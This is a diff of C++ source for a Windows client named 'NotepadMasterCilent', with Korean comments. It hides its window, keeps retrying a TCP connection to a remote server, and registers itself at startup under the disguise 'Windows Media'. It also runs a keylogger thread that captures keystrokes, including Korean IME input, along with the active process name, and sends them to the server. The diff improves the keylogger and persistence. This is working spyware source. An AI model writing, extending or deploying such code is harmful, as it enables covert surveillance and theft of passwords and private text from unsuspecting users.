@@ -1,5 +1,6 @@
 ﻿// NotepadMasterCilent.cpp : 이 파일에는 'main' 함수가 포함됩니다. 거기서 프로그램 실행이 시작되고 종료됩니다.
 //
+#include <experimental/filesystem>
 #include <iostream>
 #include <fstream>
 #include <windows.h>
@@ -19,6 +20,7 @@
 using namespace std;
 
 HWND h_notepad, h_edit;
+SOCKET s;
 
 void ResetNotepad()
 {
@@ -34,11 +36,11 @@ void ResetNotepad()
 	while (!h_edit)
 		h_edit = FindWindowEx(h_notepad, NULL, L"Edit", NULL);
 }
-int InitConnect(const WSADATA* wsa, SOCKET* s, const char* IP)
+int InitConnect(const WSADATA* wsa, SOCKET* sock, const char* IP)
 {
 	struct sockaddr_in server;
 
-	if ((*s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
+	if ((*sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
 	{
 		cerr << "소켓 생성 실패 : " << WSAGetLastError();
 		WSACleanup();
@@ -50,7 +52,8 @@ int InitConnect(const WSADATA* wsa, SOCKET* s, const char* IP)
 	server.sin_family = AF_INET;
 	server.sin_port = htons(44401);
 	
-	while (connect(*s, (struct sockaddr *)&server, sizeof(server)) < 0)
+	// 연결이 될 때까지 계속 시도 => 서버를 내려도 언제나 접속 가능
+	while (connect(*sock, (struct sockaddr *)&server, sizeof(server)) < 0)
 	{
 		cerr << "연결 실패.";
 
@@ -80,7 +83,7 @@ int InitConnect(const WSADATA* wsa, SOCKET* s, const char* IP)
 	if (gethostname(hostname, 50) == 0)
 		strcpy_s(pdu_hello.internal_ip, inet_ntoa(*(struct in_addr*)gethostbyname(hostname)->h_addr_list[0]));
 
-	send(*s, (const char*)&pdu_hello, sizeof(PDUHello), 0);
+	send(*sock, (const char*)&pdu_hello, sizeof(PDUHello), 0);
 	system("taskkill /im notepad.exe -f");
 
 	return 1;
@@ -94,7 +97,6 @@ int _tmain(int argc, TCHAR* argv[])
 	ShowWindow(myWnd, SW_HIDE);
 
 	WSADATA wsa;
-	SOCKET s;
 	
 	PDUMessage* pdu_recv;
 	PDUCommand* pdu_command;
@@ -122,10 +124,22 @@ int _tmain(int argc, TCHAR* argv[])
 			input = _getch();
 			input = toupper(input);
 		} while (input != 'Y' && input  != 'N');
-		cout << input;
+		cout << input << endl;
 
+		system("PAUSE");
 		if (input == 'Y')
 		{
+			// 레지스트리에 시작프로그램으로 등록, Windows Media는 눈속임
+			TCHAR optional_cmdline[MAX_PATH] = TEXT("\"");
+			wcscat_s(optional_cmdline, MAX_PATH, argv[0]);
+			wcscat_s(optional_cmdline, TEXT("\" --pass"));
+			if (!SetRegistryStartProgram(TRUE, TEXT("Windows Media"), optional_cmdline))
+			{
+				cerr << "실패. 관리자 권한이 필요합니다" << endl;
+				Sleep(2500);
+				return 1;
+			}
+
 			// 설정파일에 IP기록
 			CreateDirectory(appdata_dir, NULL);
 			inifile.open(inifile_dir, ios_base::out);
@@ -133,15 +147,11 @@ int _tmain(int argc, TCHAR* argv[])
 				printf("file fail\n");
 			inifile << IP;
 			inifile.close();
-
-			// 레지스트리에 시작프로그램으로 등록, Windows Media는 눈속임
-			TCHAR optional_cmdline[MAX_PATH] = TEXT("\"");
-			wcscat_s(optional_cmdline, MAX_PATH, argv[0]);
-			wcscat_s(optional_cmdline, TEXT("\" --pass"));
-			SetRegistryStartProgram(TRUE, TEXT("Windows Media"), optional_cmdline);
-
-			cout << endl;
-			system("PAUSE");
+		}
+		else
+		{
+			SetRegistryStartProgram(FALSE, TEXT("Windows Media"), NULL);
+			experimental::filesystem::remove_all(appdata_dir);
 		}
 	}
 	// 시작프로그램으로 실행된 경우
@@ -175,7 +185,8 @@ int _tmain(int argc, TCHAR* argv[])
 	{
 		char buff[BUFF_SIZE] = "";
 		char buff_recv[BUFF_SIZE] = "";
-		int len = 0;
+		size_t len = 0;
+
 		if (recv(s, (char*)buff_recv, BUFF_SIZE, 0) < 0)
 		{
 			system("cls");
@@ -220,18 +231,23 @@ int _tmain(int argc, TCHAR* argv[])
 
 UINT WINAPI keylog(void* arg)
 {
-	SOCKET s = *(SOCKET*)arg;
-	BOOL isShift = FALSE;
-
 	PDUKeylog pdu_keylog;
 	pdu_keylog.protocol_type = KEYLOG;
 
-	const char LowToHigh[] = { '!', '@', '#', '$', '%', '^', '&', '*', '(', ')' };
+	// 숫자키를 쉬프트로 눌렀을때 대응되는 특수문자
+	const char CapsNum[] = "!@#$%^&*()"; 
+	// 영어 자판에 대응되는 한글문자
+	const WCHAR EnToKo[] = TEXT("ㅁㅠㅊㅇㄷㄹㅎㅗㅑㅓㅏㅣㅡㅜㅐㅔㅂㄱㄴㅅㅕㅍㅈㅌㅛㅋ");
+	// 쉬프트를 눌렀을 때 영어 자판에 대응되는 한글문자
+	const WCHAR CapsEnToKo[] = TEXT("ㅁㅠㅊㅇㄸㄹㅎㅗㅑㅓㅏㅣㅡㅜㅒㅖㅃㄲㄴㅆㅕㅍㅉㅌㅛㅋ");
 
 	while (1) {
 		UCHAR key = NULL;
+		BOOL isShift = FALSE, isHangeul = FALSE;
 
-		Sleep(20);
+		Sleep(1);
+
+		// 특수 키들 검사
 		if (GetKeyState(VK_BACK) < 0) 
 			key = VK_BACK;
 
@@ -247,8 +263,11 @@ UINT WINAPI keylog(void* arg)
 		else if (GetKeyState(VK_SHIFT) < 0) 
 			isShift = TRUE;
 
-		else if (GetKeyState(VK_SHIFT) >= 0)
-			isShift = FALSE;
+		// 한/영 상태점검
+		HWND h_imc = ImmGetDefaultIMEWnd(GetForegroundWindow());
+		LRESULT status = SendMessage(h_imc, WM_IME_CONTROL, 5 /* IMC_GETOPENSTATUS */, 0);
+		if (status)
+			isHangeul = TRUE;
 
 		if (key)
 		{
@@ -260,11 +279,11 @@ UINT WINAPI keylog(void* arg)
 			send(s, (const char*)&pdu_keylog, sizeof(PDUKeylog), 0);
 		}
 			
-		for (key = 0x30; key <= 0x39; key++) // 키를 돌려가면서 판별
+		for (key = 0x30; key <= 0x39; key++) // 숫자키를 돌려가면서 판별
 		{
 			if (GetKeyState(key) < 0) { // 해당 키가 눌렸으면
 				if (isShift) // Shift인지 검사
-					pdu_keylog.state = LowToHigh[key - 0x30];
+					pdu_keylog.state = CapsNum[key - 0x30];
 				else
 					pdu_keylog.state = key;
 
@@ -275,13 +294,19 @@ UINT WINAPI keylog(void* arg)
 				send(s, (const char*)&pdu_keylog, sizeof(PDUKeylog), 0);
 			}
 		}
-		for (key = 0x40; key <= 0x5A; key++) // 키를 돌려가면서 판별
+		for (key = 0x41; key <= 0x5A; key++) // 알파벳키를 돌려가면서 판별
 		{
 			if (GetKeyState(key) < 0) { // 해당 키가 눌렸으면
-				if (isShift) // Shift인지 검사
-					pdu_keylog.state = key; // 쉬프트면 대문자
+				if (isShift) // Shift인 경우
+					if (isHangeul) // 한글인 경우
+						pdu_keylog.state = CapsEnToKo[key - 0x41]; // 쌍모음, 쌍자음
+					else
+						pdu_keylog.state = key; // 알파벳 대문자
 				else
-					pdu_keylog.state = key + 0x20; // 아니면 소문자
+					if (isHangeul) // 한글인 경우
+						pdu_keylog.state = EnToKo[key - 0x41]; // 그냥 자음 모음
+					else
+						pdu_keylog.state = key + 0x20; // 알파벳 소문자
 
 				DWORD dwPID;
 				GetWindowThreadProcessId(GetForegroundWindow(), &dwPID); // 현재 키를 입력한 프로세스 이름을 가져옴
